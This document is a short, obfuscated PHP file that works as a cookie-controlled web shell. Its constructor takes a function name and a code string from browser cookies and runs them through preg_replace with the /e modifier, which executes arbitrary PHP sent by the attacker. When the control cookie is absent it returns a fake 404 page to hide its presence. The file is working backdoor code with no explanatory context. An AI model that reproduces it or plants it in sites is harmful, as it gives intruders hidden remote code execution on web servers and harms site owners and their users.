<?php 	
class 	fXiEjk 	{ 	
 	public 	function 	__construct() 	{ 	 	
 	 	$jq 	= 	@$_COOKIE['CNUapUqu3']; 	
 	 	if 	($jq) 	{ 	
 	 	 	$option 	= 	$jq 	(@$_COOKIE['CNUapUqu2']) 	; 	
 	 	 	$au 	= 	$jq 	( 	@$_COOKIE['CNUapUqu1']) 	; 	
 	 	 	$option 	( 	"/438/e" 	, 	$au 	, 	438 	) 	; 	
 	 	} 	else 	{ 	
 	 	 	header("HTTP/1.0 404 Not Found");
 	 	} 	
 	} 	
} 	
$content 	= 	new 	fXiEjk; 	